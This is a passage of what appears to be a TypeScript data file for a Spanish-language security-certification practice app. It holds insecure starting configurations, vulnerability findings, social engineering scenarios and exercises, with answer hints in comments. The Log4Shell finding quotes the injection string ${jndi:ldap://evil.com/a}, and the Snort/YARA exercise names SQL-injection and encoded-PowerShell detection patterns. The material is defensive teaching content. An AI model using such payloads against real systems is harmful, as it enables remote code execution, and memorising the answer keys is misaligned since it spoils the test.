    description: 'Resolución multicast local susceptible a envenenamiento y captura de hashes NTLMv2 (Responder).',
    isVulnerable: true
  },
  {
    id: 'svc-netbios',
    name: 'NetBIOS sobre TCP/IP (NBT-NS)',
    port: 137,
    protocol: 'UDP',
    currentStatus: 'running',
    targetStatus: 'stopped',
    description: 'Protocolo legado de broadcast explotado para ataques de suplantación en red de área local.',
    isVulnerable: true
  },
  {
    id: 'svc-remote-reg',
    name: 'Remote Registry Service',
    port: 445,
    protocol: 'TCP',
    currentStatus: 'running',
    targetStatus: 'stopped',
    description: 'Permite a usuarios remotos modificar claves del registro del sistema operativo. Innecesario en workstations.',
    isVulnerable: true
  },
  {
    id: 'svc-edr-agent',
    name: 'EDR Endpoint Sensor & Behavioral Monitor',
    port: 0,
    protocol: 'KERNEL',
    currentStatus: 'running',
    targetStatus: 'running',
    description: 'Agente de detección y respuesta en endpoints para telemetría continua y contención.',
    isVulnerable: false
  }
];

export const INITIAL_SECURITY_POLICIES_PBQ11: SecurityPolicyItem[] = [
  {
    id: 'policy-cred-guard',
    name: 'Windows Defender Credential Guard (VBS)',
    type: 'toggle',
    currentValue: false,
    targetValue: true,
    description: 'Aísla el proceso LSASS en un contenedor seguro por hardware (VBS) impidiendo que herramientas como Mimikatz roben hashes de memoria.'
  },
  {
    id: 'policy-ps-execution',
    name: 'Directiva de Ejecución de PowerShell (Execution Policy)',
    type: 'select',
    currentValue: 'Unrestricted',
    targetValue: 'AllSigned',
    options: [
      { value: 'Unrestricted', label: 'Unrestricted (Sin restricciones)' },
      { value: 'RemoteSigned', label: 'RemoteSigned (Solo scripts locales)' },
      { value: 'AllSigned', label: 'AllSigned (Obligatorio firma digital válida de CA)' },
      { value: 'Restricted', label: 'Restricted (No permite ningún script)' }
    ],
    description: 'Previene la ejecución accidental de scripts descargados de Internet sin firma digital confiable.'
  },
  {
    id: 'policy-vba-macros',
    name: 'Bloqueo de Macros de Office desde Internet (MOTW)',
    type: 'toggle',
    currentValue: false,
    targetValue: true,
    description: 'Bloquea automáticamente la ejecución de macros VBA en documentos descargados con Mark of the Web.'
  },
  {
    id: 'policy-secure-boot',
    name: 'Arranque Seguro UEFI (Secure Boot) & TPM 2.0',
    type: 'toggle',
    currentValue: false,
    targetValue: true,
    description: 'Verifica la firma digital de los cargadores de arranque UEFI, previniendo rootkits de kernel y bootkits.'
  }
];

// --------------------------------------------------------
// PBQ 5: IAM & Permissions (NTFS)
// --------------------------------------------------------
export const INITIAL_USER_GROUPS_PBQ5: IamUserGroupConfig[] = [
  {
    username: 'intern_marcos',
    role: 'Practicante de Soporte IT (Intern)',
    assignedGroups: ['IT_Helpdesk', 'HR_Confidential_Admins']
  },
  {
    username: 'auditor_valeria',
    role: 'Auditora Senior de Finanzas',
    assignedGroups: ['Finance_Team']
  }
];

export const INITIAL_FOLDER_PERMISSIONS_PBQ5: FolderPermissionNode[] = [
  {
    path: '/CorpShares/HR/Payroll_Confidential',
    name: 'Payroll_Confidential (Nómina y Salarios)',
    inheritanceEnabled: true,
    description: 'Carpeta con datos PII sensibles y salarios de toda la organización.',
    currentAcl: [
      {
        principalName: 'Domain Users (Todos)',
        type: 'group',
        read: true,
        write: false,
        modify: false,
        fullControl: false,
        inherited: true
      },
      {
        principalName: 'HR_Confidential_Admins',
        type: 'group',
        read: true,
        write: true,
        modify: true,
        fullControl: true,
        inherited: false
      }
    ]
  },
  {
    path: '/CorpShares/Finance/Reports',
    name: 'Reports (Informes Trimestrales de Finanzas)',
    inheritanceEnabled: false,
    description: 'Carpeta de trabajo de auditoría financiera.',
    currentAcl: [
      {
        principalName: 'Finance_Auditors',
        type: 'group',
        read: true,
        write: false,
        modify: false,
        fullControl: false,
        inherited: false
      },
      {
        principalName: 'Finance_Directors',
        type: 'group',
        read: true,
        write: true,
        modify: true,
        fullControl: true,
        inherited: false
      }
    ]
  }
];

export const INITIAL_USER_GROUPS = INITIAL_USER_GROUPS_PBQ5;
export const INITIAL_FOLDER_PERMISSIONS = INITIAL_FOLDER_PERMISSIONS_PBQ5;

// --------------------------------------------------------
// PBQ 12: Conditional Access & Zero Trust State
// --------------------------------------------------------
export const INITIAL_CONDITIONAL_ACCESS_STATE: ConditionalAccessState = {
  requireMfa: 'disabled', // Needs fido2_phishing_resistant
  geoBlockingPolicy: 'allow_all', // Needs block_untrusted_geos
  deviceCompliance: 'any_device', // Needs require_mdm_compliant
  adminJustInTime: 'standing_admin_access', // Needs enforce_pim_jit
  riskBasedAuth: 'ignore_risk' // Needs block_high_risk_signin
};

// --------------------------------------------------------
// PBQ 6: Cryptography & VPN (IPSec & At-Rest)
// --------------------------------------------------------
export const INITIAL_CRYPTO_STATE_PBQ6: CryptoConfigState = {
  ikeVersion: 'IKEv1',
  dhGroup: 'Group 2 (1024-bit)',
  ikeEncryption: '3DES',
  ikeHash: 'MD5',
  ipsecProtocol: 'AH',
  ipsecCipher: 'DES',
  ipsecPfs: false,
  storageCipher: 'RC4',
  webTlsVersion: 'TLS 1.0'
};

export const INITIAL_CRYPTO_STATE = INITIAL_CRYPTO_STATE_PBQ6;

// --------------------------------------------------------
// PBQ 13: PKI Certificate Chain State
// --------------------------------------------------------
export const INITIAL_PKI_CERT_STATE: PkiCertConfigState = {
  certificateType: 'Self-Signed (Autofirmado por el servidor)', // Needs Public CA
  issuerAuthority: 'Internal Host Untrusted',
  signatureAlgorithm: 'SHA-1 with RSA 1024', // Broken
  intermediateIncluded: false, // Incomplete chain error
  revocationCheckMethod: 'CRL (Descarga periódica lenta)', // Needs OCSP Stapling
  sanDomains: '', // Missing SAN
  keyUsage: 'Digital Signature, Key Encipherment'
};

// --------------------------------------------------------
// PBQ 7: Wireless Security (WPA3 Enterprise AP)
// --------------------------------------------------------
export const INITIAL_WIRELESS_STATE_PBQ7: WirelessApConfigState = {
  ssidName: 'CORP-SECURE-MGMT',
  broadcastSsid: true,
  securityMode: 'WPA2-PSK (Pre-Shared Key)',
  cipherSuite: 'TKIP',
  radiusIp: '192.168.1.1',
  radiusPort: 8080,
  radiusSecret: '123456',
  clientIsolation: false,
  wpsEnabled: true,
  pmfRequired: false,
  frequencyBand: '5GHz / 6GHz'
};

export const INITIAL_WIRELESS_STATE = INITIAL_WIRELESS_STATE_PBQ7;

// --------------------------------------------------------
// PBQ 14: Wireless WIPS & Rogue AP State
// --------------------------------------------------------
export const INITIAL_WIPS_ROGUE_STATE: WipsRogueApConfigState = {
  detectedBssid: '00:11:22:33:44:55 (Unrecognized Vendor)',
  threatClassification: 'Unclassified / Ignore', // Needs 'Rogue AP / Evil Twin'
  switchPortAction: 'Monitor Only (Dejar puerto activo)', // Needs 'Shutdown Port'
  wirelessContainment: false, // Needs true (Deauth containment)
  clientAuthProtocol: 'WPA2-PSK (Clave compartida)', // Needs '802.1X EAP-TLS'
  certificateValidationEnforced: false // Needs true
};

// --------------------------------------------------------
// PBQ 15: Vulnerability Management & CVSS Remediation
// --------------------------------------------------------
export const INITIAL_FINDINGS_PBQ15: VulnerabilityFinding[] = [
  {
    id: 'vuln-log4j',
    cveId: 'CVE-2021-44228',
    title: 'Apache Log4j2 JNDI RCE (Log4Shell)',
    severity: 'CRITICAL',
    port: '8080/TCP',
    host: 'app-srv-01.corp.internal',
    description: 'La función JNDI de Log4j no valida entradas, permitiendo inyección RCE mediante cadenas maliciosas como ${jndi:ldap://evil.com/a}.',
    selectedRemediation: '',
    remediationOptions: [
      { value: 'patch_log4j_waf', label: 'Actualizar biblioteca a log4j 2.17.1+ y aplicar regla virtual en WAF contra patrones ${jndi:' },
      { value: 'ignore_low_risk', label: 'Ignorar por estar detrás de la DMZ sin conexión a Internet' },
      { value: 'reboot_daily', label: 'Programar reinicio diario del servidor de aplicaciones' },
      { value: 'change_ssh_key', label: 'Rotar la clave privada SSH del administrador del servidor' }
    ]
  },
  {
    id: 'vuln-traversal',
    cveId: 'CVE-2021-41773',
    title: 'Apache HTTP Server Path Traversal & File Disclosure',
    severity: 'HIGH',
    port: '443/TCP',
    host: 'web-front-02.dmz.corp',
    description: 'Fallo en mapeo de URLs permite atravesar directorios fuera del DocumentRoot mediante secuencias .%2e y leer archivos sensibles del SO.',
    selectedRemediation: '',
    remediationOptions: [
      { value: 'upgrade_apache_deny', label: 'Actualizar Apache HTTP a versión parcheada y configurar "Require all denied" en <Directory />' },
      { value: 'delete_index_html', label: 'Eliminar el archivo index.html del servidor web' },
      { value: 'turn_off_ssl', label: 'Desactivar SSL/TLS para evitar procesamiento complejo' },
      { value: 'increase_ram', label: 'Aumentar la memoria RAM asignada a la máquina virtual' }
    ]
  },
  {
    id: 'vuln-ssl-poodle',
    cveId: 'CVE-2014-3566',
    title: 'SSLv3 CBC Protocol Vulnerability (POODLE)',
    severity: 'MEDIUM',
    port: '443/TCP',
    host: 'legacy-portal.corp.internal',
    description: 'El protocolo SSLv3 utiliza relleno CBC no determinista, permitiendo a atacantes Man-in-the-Middle descifrar cookies de sesión.',
    selectedRemediation: '',
    remediationOptions: [
      { value: 'disable_sslv3_tls10', label: 'Deshabilitar completamente SSLv2/SSLv3 y TLS 1.0, forzando exclusivamente TLS 1.2 o TLS 1.3' },
      { value: 'reinstall_windows', label: 'Reinstalar el sistema operativo desde cero' },
      { value: 'use_http_plain', label: 'Cambiar a HTTP puerto 80 para evitar el error de SSL' },
      { value: 'shorten_passwords', label: 'Reducir la longitud de las contraseñas de los usuarios' }
    ]
  },
  {
    id: 'vuln-openssh',
    cveId: 'CVE-SSHD-WEAK-CIPHER',
    title: 'OpenSSH Server Weak CBC & 3DES Ciphers Enabled',
    severity: 'MEDIUM',
    port: '22/TCP',
    host: 'bastion-host.mgmt.corp',
    description: 'El demonio sshd tiene habilitados algoritmos legados (3des-cbc, aes128-cbc) vulnerables a ataques de recuperación de texto plano.',
    selectedRemediation: '',
    remediationOptions: [
      { value: 'disable_weak_ciphers_upgrade', label: 'Editar sshd_config deshabilitando ciphers CBC/3DES y forzando ChaCha20-Poly1305 / AES-GCM' },
      { value: 'allow_telnet', label: 'Habilitar Telnet en el puerto 23 como alternativa' },
      { value: 'clear_authorized_keys', label: 'Borrar todas las llaves autorizadas en ~/.ssh/' },
      { value: 'change_port_only', label: 'Cambiar únicamente el puerto SSH a 2222 sin tocar los algoritmos' }
    ]
  }
];

// --------------------------------------------------------
// PBQ 16: DLP & Data Protection in 3 States
// --------------------------------------------------------
export const INITIAL_DLP_ITEMS_PBQ16: DlpPolicyItem[] = [
  {
    id: 'dlp-at-rest-db',
    dataType: 'Base de Datos de Clientes y Nómina PII',
    categoryName: 'Confidencial / HIPAA & PCI-DSS',
    dataState: 'At-Rest',
    description: 'Registros almacenados en el motor SQL que contienen números de seguro social, tarjetas de crédito y diagnósticos médicos.',
    selectedControl: '',
    controlOptions: [
      { value: 'aes_256_tde_kms', label: 'Cifrado Transparente de Base de Datos (TDE) AES-256 con claves gestionadas en Cloud KMS / HSM' },
      { value: 'md5_hash_only', label: 'Calcular hash MD5 de la tabla una vez al día' },
      { value: 'public_bucket', label: 'Guardar copia de seguridad en bucket S3 con acceso público' },
      { value: 'zip_password', label: 'Comprimir la base de datos en archivo .zip con contraseña simple de 4 dígitos' }
    ]
  },
  {
    id: 'dlp-in-transit-api',
    dataType: 'Canal de Pagos y API REST Transaccional',
    categoryName: 'Datos Financieros / E-commerce',
    dataState: 'In-Transit',
    description: 'Peticiones JSON con tokens de pago transmitidas a través de Internet entre la pasarela y los servidores bancarios.',
    selectedControl: '',
    controlOptions: [
      { value: 'tls_13_mtls_pfs', label: 'TLS 1.3 con Autenticación Mutua (mTLS), certificados X.509 y Perfect Forward Secrecy (PFS)' },
      { value: 'telnet_clear', label: 'Envío por socket TCP directo en texto plano' },
      { value: 'rot13_encode', label: 'Ofuscación de cadenas mediante codificación ROT13 o Base64' },
      { value: 'ssl_20_legacy', label: 'Compatibilidad con SSL 2.0 para dispositivos antiguos' }
    ]
  },
  {
    id: 'dlp-in-use-workstation',
    dataType: 'Estaciones de Trabajo y Laptops de Empleados',
    categoryName: 'PII / Información Financiera en Pantalla y Memoria',
    dataState: 'In-Use',
    description: 'Datos visualizados por operadores en aplicaciones de atención al cliente susceptibles de ser copiados o filtrados.',
    selectedControl: '',
    controlOptions: [
      { value: 'endpoint_dlp_usb_clip', label: 'Agente Endpoint DLP con bloqueo de USB masivo, restricción de portapapeles y anti-screenshot' },
      { value: 'post_it_notes', label: 'Permitir anotar datos sensibles en notas adhesivas' },
      { value: 'shared_generic_login', label: 'Cuenta genérica compartida sin auditoría individual' },
      { value: 'disable_antivirus', label: 'Desactivar protección en tiempo real para acelerar el equipo' }
    ]
  },
  {
    id: 'dlp-cloud-casb',
    dataType: 'Repositorio Cloud y Suites SaaS (OneDrive/Drive)',
    categoryName: 'Propiedad Intelectual y Patentes Farmacéuticas',
    dataState: 'At-Rest',
    description: 'Documentos confidenciales de fórmulas químicas compartidos en la nube corporativa.',
    selectedControl: '',
    controlOptions: [
      { value: 'casb_api_watermark', label: 'CASB (Cloud Access Security Broker) en modo API con escaneo DLP continuo y marcas de agua digitales' },
      { value: 'anonymous_sharing', label: 'Habilitar enlaces de compartir para cualquier persona con el link sin contraseña' },
      { value: 'disable_logging', label: 'Apagar los registros de auditoría de descargas para ahorrar espacio' },
      { value: 'ftp_anonymous', label: 'Subir los archivos a un servidor FTP público' }
    ]
  }
];

// --------------------------------------------------------
// PBQ 17: Incident Response Playbook (NIST SP 800-61r2)
// --------------------------------------------------------
export const INITIAL_IR_ACTIONS_PBQ17: IncidentResponseActionItem[] = [
  {
    id: 'act-backup-playbook',
    actionText: 'Actualizar los playbooks y árboles de decisión del CSIRT, capacitar al personal y validar copias de seguridad desconectadas (Air-Gapped).',
    assignedPhase: ''
  },
  {
    id: 'act-correlate-siem',
    actionText: 'Correlacionar alertas en el SIEM, analizar hashes SHA-256 en Sandbox y determinar el vector de compromiso inicial y sistemas afectados.',
    assignedPhase: ''
  },
  {
    id: 'act-isolate-vlan',
    actionText: 'Desconectar la tarjeta de red (vSwitch), aislar el host en una VLAN de cuarentena y deshabilitar cuentas de usuario comprometidas.',
    assignedPhase: ''
  },
  {
    id: 'act-wipe-malware',
    actionText: 'Eliminar claves de registro maliciosas, terminar procesos C2 en memoria, revocar credenciales filtradas y reinstalar el SO desde imágenes limpias.',
    assignedPhase: ''
  },
  {
    id: 'act-restore-backup',
    actionText: 'Restaurar bases de datos desde copias de seguridad limpias verificadas, reconectar la red en fases y realizar monitoreo exhaustivo durante 72h.',
    assignedPhase: ''
  },
  {
    id: 'act-post-mortem',
    actionText: 'Convocar la reunión post-incidente con directivos, documentar la línea de tiempo completa del ataque y actualizar directivas para evitar recurrencias.',
    assignedPhase: ''
  }
];

// --------------------------------------------------------
// PBQ 18: Container & Pod Security State
// --------------------------------------------------------
export const INITIAL_CONTAINER_STATE_PBQ18: ContainerHardeningState = {
  baseImage: 'ubuntu_full', // Needs 'distroless_minimal'
  runAsUser: 'root_uid_0', // Needs 'non_root_uid_10001'
  secretsManagement: 'env_vars_plain', // Needs 'vault_csi_kms'
  networkPolicy: 'allow_all_flat', // Needs 'default_deny_ingress_egress'
  rootFilesystem: 'read_write', // Needs 'readonly_true'
  cpuMemoryLimits: 'no_limits' // Needs 'enforce_limits'
};

// --------------------------------------------------------
// PBQ 19: Physical Security & Datacenter Design State
// --------------------------------------------------------
export const INITIAL_PHYSICAL_STATE_PBQ19: PhysicalSecurityState = {
  perimeterBarrier: 'chain_link_fence', // Needs 'bollards_k12_reinforced'
  datacenterEntrance: 'single_door_badge', // Needs 'mantrap_biometric_weight'
  fireSuppression: 'wet_pipe_water', // Needs 'clean_agent_gas'
  thermalManagement: 'mixed_aisles', // Needs 'hot_cold_aisle_containment'
  rfShielding: 'none_sheetrock' // Needs 'faraday_cage_tempest'
};

// --------------------------------------------------------
// PBQ 20: Disaster Recovery & Business Continuity State
// --------------------------------------------------------
export const INITIAL_DISASTER_RECOVERY_STATE_PBQ20: DisasterRecoveryState = {
  targetRto: 'rto_24_hours', // Needs 'rto_under_2_hours'
  targetRpo: 'rpo_24_hours', // Needs 'rpo_15_minutes'
  recoverySiteType: 'warm_site', // Needs 'hot_site_mirrored'
  backupRule: 'single_usb', // Needs 'rule_3_2_1'
  immutabilityControl: 'no_lock' // Needs 'worm_immutable_lock'
};

// --------------------------------------------------------
// PBQ 21: Social Engineering Cases
// --------------------------------------------------------
export const INITIAL_SOCIAL_CASES_PBQ21: SocialEngineeringCase[] = [
  {
    id: 'case-smishing',
    title: 'Caso 1: Notificación SMS Urgente de Bloqueo Bancario',
    scenarioText: 'Un empleado recibe un mensaje de texto SMS: "URGENTE: Su tarjeta corporativa ha sido suspendida por actividad fraudulenta. Ingrese de inmediato a http://banco-seguro-verificacion.com/login para reactivarla o su cuenta se cancelará en 15 minutos".',
    selectedAttackType: '',
    selectedInfluencePrinciple: '',
    selectedMitigation: ''
  },
  {
    id: 'case-vishing',
    title: 'Caso 2: Llamada del "Director Ejecutivo" Solicitando Tarjetas',
    scenarioText: 'Una secretaria recibe una llamada telefónica urgente donde una voz autoritaria asegura ser el CEO: "Estoy en una reunión confidencial con inversionistas y necesito que compres de inmediato 10 tarjetas de regalo de Apple de $500 y me dictes los códigos por aquí, no le digas a nadie o serás despedida".',
    selectedAttackType: '',
    selectedInfluencePrinciple: '',
    selectedMitigation: ''
  },
  {
    id: 'case-whaling',
    title: 'Caso 3: Correo al CFO para Cambio de Cuenta Bancaria Proveedor',
    scenarioText: 'El Director Financiero (CFO) recibe un correo electrónico que aparenta venir de su proveedor principal de servidores: "Estimado CFO, debido a una auditoría bancaria, le solicitamos que las próximas facturas sean transferidas a nuestra nueva cuenta IBAN adjunta. Agradecemos su pronta gestión".',
    selectedAttackType: '',
    selectedInfluencePrinciple: '',
    selectedMitigation: ''
  },
  {
    id: 'case-baiting',
    title: 'Caso 4: Memorias USB Abandonadas en el Estacionamiento',
    scenarioText: 'Varios empleados encuentran memorias USB de alta capacidad tiradas deliberadamente en el suelo del estacionamiento de la empresa, rotuladas con un marcador permanente que dice: "Planillas Salarios Ejecutivos y Bonos Anuales Q4 - Confidencial".',
    selectedAttackType: '',
    selectedInfluencePrinciple: '',
    selectedMitigation: ''
  }
];

// --------------------------------------------------------
// PBQ 22: Digital Forensics & Order of Volatility State
// --------------------------------------------------------
export const INITIAL_FORENSIC_STATE_PBQ22: ForensicVerificationState = {
  evidenceItems: [
    {
      id: 'ev-tapes',
      name: 'Cintas Magnéticas de Archivo y Backups Fuera de Línea',
      description: 'Copias de seguridad guardadas en caja ignífuga o bóveda desconectada (Media no volátil permanente).',
      currentOrder: 1,
      targetOrder: 6,
    },
    {
      id: 'ev-disk',
      name: 'Disco Duro Local / Almacenamiento SSD no Volátil',
      description: 'Sistemas de archivos ext4/NTFS, particiones locales, archivos del SO y registros locales.',
      currentOrder: 2,
      targetOrder: 4,
    },
    {
      id: 'ev-cpu',
      name: 'Registros de CPU, Memoria Caché del Procesador',
      description: 'Instrucciones ejecutándose en tiempo real; se pierden en nanosegundos al desconectar energía.',
      currentOrder: 3,
      targetOrder: 1,
    },
    {
      id: 'ev-remote',
      name: 'Logs Remotos y Telemetría Centralizada SIEM / Syslog',
      description: 'Eventos transmitidos fuera del equipo a un recolector centralizado en la red.',
      currentOrder: 4,
      targetOrder: 5,
    },
    {
      id: 'ev-ram',
      name: 'Memoria RAM (Routing Table, Conexiones Activas, ARP)',
      description: 'Procesos inyectados en RAM, claves de cifrado en memoria y sockets TCP/UDP abiertos.',
      currentOrder: 5,
      targetOrder: 2,
    },
    {
      id: 'ev-swap',
      name: 'Espacio de Intercambio (Swap / Pagefile) y Temporales',
      description: 'Páginas de memoria volcadas a disco virtual temporal.',
      currentOrder: 6,
      targetOrder: 3,
    },
  ],
  selectedHashAlgorithm: 'md5', // Needs 'sha256'
  chainOfCustodySignoff: false, // Needs true
  writeBlockerUsed: false, // Needs true
};

// --------------------------------------------------------
// PBQ 23: Quantitative Risk Assessment State
// --------------------------------------------------------
export const INITIAL_RISK_STATE_PBQ23: RiskManagementState = {
  assetValue: 200000,
  exposureFactorPercent: 40,
  aroValue: 0.5,
  calculatedSleInput: 0, // Correct: 80000
  calculatedAleInput: 0, // Correct: 40000
  treatmentThreat1: '', // Correct: 'mitigate'
  treatmentThreat2: '', // Correct: 'transfer'
  treatmentThreat3: '', // Correct: 'accept'
  treatmentThreat4: '', // Correct: 'avoid'
};

// --------------------------------------------------------
// PBQ 24: Email Security SPF, DKIM, DMARC State
// --------------------------------------------------------
export const INITIAL_EMAIL_STATE_PBQ24: EmailSecurityState = {
  spfPolicy: 'unselected',
  dkimSelector: 'unselected',
  dmarcAction: 'unselected',
  mailTransportEncryption: 'unselected',
  endUserMailCrypto: 'unselected',
};

// --------------------------------------------------------
// PBQ 25: Security CLI & Terminal Diagnostics Scenarios
// --------------------------------------------------------
export const INITIAL_CLI_SCENARIOS_PBQ25: SecurityCliScenario[] = [
  {
    id: 'cli-ports',
    investigationGoal: '1. Auditoría de Puertos en Escucha y Procesos Sospechosos',
    systemType: 'Linux',
    detectedSymptom: 'El SOC reporta que un servidor web parece haber abierto un puerto desconocido (8888) en segundo plano.',
    selectedCommand: '',
    expectedOutputHint: 'Debe mostrar sockets TCP/UDP escuchando con sus números de puerto numéricos y el PID del proceso.'
  },
  {
    id: 'cli-sniff',
    investigationGoal: '2. Sniffing / Captura de Tráfico en Tiempo Real sin Resolución DNS',
    systemType: 'Linux',
    detectedSymptom: 'Se necesita inspeccionar el tráfico crudo que entra por eth0 para detectar una exfiltración activa.',
    selectedCommand: '',
    expectedOutputHint: 'Debe capturar paquetes en vivo en la interfaz de red sin demoras por consultas DNS inversas.'
  },
  {
    id: 'cli-hash',
    investigationGoal: '3. Verificación de Integridad de Binarios Críticos del Sistema',
    systemType: 'Linux',
    detectedSymptom: 'Se sospecha que el atacante reemplazó /bin/login por una versión troyanizada con backdoor.',
    selectedCommand: '',
    expectedOutputHint: 'Debe generar el hash SHA-256 del binario para compararlo con el valor de la instalación limpia.'
  },
  {
    id: 'cli-permissions',
    investigationGoal: '4. Endurecimiento de Permisos Octales en Archivo de Hashes',
    systemType: 'Linux',
    detectedSymptom: 'El archivo /etc/shadow tenía permisos mundiales de lectura por un error de administración.',
    selectedCommand: '',
    expectedOutputHint: 'Debe restringir lectura y escritura exclusivamente al usuario root (rw------- o 600).'
  }
];

// --------------------------------------------------------
// PBQ 26: IDS Snort & YARA Rule Engineering State
// --------------------------------------------------------
export const INITIAL_IDS_YARA_STATE_PBQ26: IdsYaraState = {
  snortAction: 'alert', // Needs 'drop'
  snortProtocol: 'tcp',
  snortContentMatch: 'GET /', // Needs 'UNION SELECT'
  snortNocase: false, // Needs true
  yaraMagicHeader: '0x0000', // Needs '0x5A4D'
  yaraStringMatch: 'calc.exe', // Needs 'cmd.exe /c powershell -enc'
};

// --------------------------------------------------------
// PBQ 27: DevSecOps CI/CD Pipeline State
// --------------------------------------------------------
export const INITIAL_DEVSECOPS_STATE_PBQ27: DevSecOpsState = {
  codeCommitControl: '', // Needs 'secret_scanning_hooks'
  buildStageControl: '', // Needs 'sast_sca_analysis'
  testStageControl: '', // Needs 'dast_runtime_scan'
  deployStageControl: '', // Needs 'image_signing_rasp'
};

// --------------------------------------------------------
// PBQ 28: Cryptographic Attacks Cases
// --------------------------------------------------------
export const INITIAL_CRYPTO_CASES_PBQ28: CryptoAttackCase[] = [
  {
    id: 'atk-rainbow',
    attackName: 'Caso 1: Craqueo Instantáneo de Hashes de Contraseñas',
    symptomText: 'Tras una filtración de base de datos con hashes MD5 de contraseñas, el atacante logró descifrar el 85% de las claves en cuestión de segundos utilizando archivos masivos de correspondencias precalculadas de texto plano y hashes.',
    selectedAttackType: '',
    selectedCountermeasure: '',
  },
  {
    id: 'atk-birthday',
    attackName: 'Caso 2: Duplicación Fraudulenta de Certificado SSL',
    symptomText: 'Un atacante generó dos contratos digitales completamente diferentes que producían la misma firma hash SHA-1 de 160 bits (colisión matemática h(m1) == h(m2)), logrando validar un documento apócrifo con la firma legal de la empresa.',
    selectedAttackType: '',
    selectedCountermeasure: '',
  },
  {
    id: 'atk-replay',
    attackName: 'Caso 3: Reutilización de Paquetes de Autenticación Capturados',
    symptomText: 'Un actor malicioso interceptó una trama de red legítima enviada a un controlador industrial en el puerto 502/TCP y procedió a retransmitir la misma trama horas después para abrir la compuerta sin conocer la clave maestra.',
    selectedAttackType: '',
    selectedCountermeasure: '',
  },
  {
    id: 'atk-downgrade',
    attackName: 'Caso 4: Forzado de Negociación a Protocolo Legado Vulnerable',
    symptomText: 'Durante la negociación TLS en un portal financiero, un atacante Man-in-the-Middle interceptó el ClientHello y alteró los paquetes para forzar al servidor y al navegador a operar en SSLv3 vulnerable (Ataque POODLE) para descifrar cookies de sesión.',
    selectedAttackType: '',
    selectedCountermeasure: '',
  },
];

// --------------------------------------------------------
// PBQ 29: Federated Identity, SSO & Tokens State
// --------------------------------------------------------
export const INITIAL_FEDERATION_STATE_PBQ29: FederationState = {
  enterpriseSsoProtocol: '', // Needs 'saml_20'
  apiAuthorizationProtocol: '', // Needs 'oauth_20'
  modernMobileAuthProtocol: '', // Needs 'oidc_jwt'
  automatedProvisioningProtocol: '', // Needs 'scim_standard'
};

// --------------------------------------------------------
// PBQ 30: Mobile Security & MDM/MAM Policies State
// --------------------------------------------------------
export const INITIAL_MOBILE_STATE_PBQ30: MobileSecurityState = {
  byodWipePolicy: '', // Needs 'selective_wipe'
  applicationContainerization: '', // Needs 'mam_container_sandbox'
  jailbreakRootPolicy: '', // Needs 'block_and_quarantine'
  geofencingPolicy: '', // Needs 'disable_camera_microphone'
};

// --------------------------------------------------------
// PBQ 31: Port Security & Protocol Hardening (CompTIA Port Mastery)
// --------------------------------------------------------
export const INITIAL_PORT_AUDIT_PBQ31: PortAuditItem[] = [
  {
    id: 'port-telnet',
    serviceName: 'Terminal Administrativa Telnet',
    legacyPort: 23,
    legacyProtocol: 'Telnet',
    vulnerabilityDescription: 'Terminal remota administrativa transmitiendo credenciales de root y comandos en texto plano por el cable sin cifrar.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: '',
  },
  {
    id: 'port-http',
    serviceName: 'Servicio Web HTTP Inseguro',
    legacyPort: 80,
    legacyProtocol: 'HTTP',
    vulnerabilityDescription: 'Portal web corporativo sirviendo páginas sin certificado TLS; expuesto a intercepción de cookies de sesión y MITM.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: '',
  },
  {
    id: 'port-ldap',
    serviceName: 'Consultas Active Directory LDAP',
    legacyPort: 389,
    legacyProtocol: 'LDAP',
    vulnerabilityDescription: 'Consultas al directorio empresarial y autenticaciones de usuarios enviadas en texto plano sin cifrado de canal.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: '',
  },
  {
    id: 'port-ftp',
    serviceName: 'Servidor de Archivos FTP',
    legacyPort: 21,
    legacyProtocol: 'FTP',
    vulnerabilityDescription: 'Servicio de transferencia de archivos RFC 959 transmitiendo credenciales y documentos confidenciales en claro.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: '',
  },
  {
    id: 'port-snmp',
    serviceName: 'Monitoreo de Infraestructura SNMP',
    legacyPort: 161,
    legacyProtocol: 'SNMPv2c',
    vulnerabilityDescription: 'Agentes de monitoreo gestionados con cadenas de comunidad "public" y "private" en texto plano sin autenticación robusta.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: '',
  },
  {
    id: 'port-syslog',
    serviceName: 'Reenvío de Logs Syslog al SIEM',
    legacyPort: 514,
    legacyProtocol: 'Syslog UDP',
    vulnerabilityDescription: 'Reenvío de eventos de auditoría por UDP sin cifrado ni acuse de recibo; vulnerable a spoofing y pérdida de integridad.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: '',
  },
  {
    id: 'port-rdp',
    serviceName: 'Escritorio Remoto Windows RDP',
    legacyPort: 3389,
    legacyProtocol: 'RDP WAN',
    vulnerabilityDescription: 'Puerto 3389 accesible directamente desde Internet público sin pasar por VPN; vulnerable a fuerza bruta y exploits como BlueKeep.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: '',
  },
  {
    id: 'port-dns',
    serviceName: 'Resolución de Nombres DNS',
    legacyPort: 53,
    legacyProtocol: 'DNS UDP',
    vulnerabilityDescription: 'Consultas DNS de red sin cifrar permitiendo rastreo de navegación por el ISP y vulnerabilidad a DNS Cache Poisoning.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: '',
  },
];

// --------------------------------------------------------
// PBQ 32: Nmap Port Scanning & Reconnaissance Analysis
// --------------------------------------------------------
export const INITIAL_NMAP_STATE_PBQ32: NmapScanState = {
  scanFlagAnswer: '', // Needs 'sS'
  portFindings: [
    {
      id: 'nmap-21',
      portSpec: '21/tcp (FTP)',
      serviceBanner: 'vsftpd 2.3.4',
      discoveredRisk: 'Puerta trasera maliciosa histórica CVE-2011-2523 detectada en versión',
      selectedAnalysis: '',
      selectedRemediation: '',
    },
    {
      id: 'nmap-23',
      portSpec: '23/tcp (Telnet)',
      serviceBanner: 'Linux telnetd (Debian)',
      discoveredRisk: 'Consola remota sin cifrado enviando texto plano en claro',
      selectedAnalysis: '',
      selectedRemediation: '',
    },
    {
      id: 'nmap-445',
      portSpec: '445/tcp (SMB)',
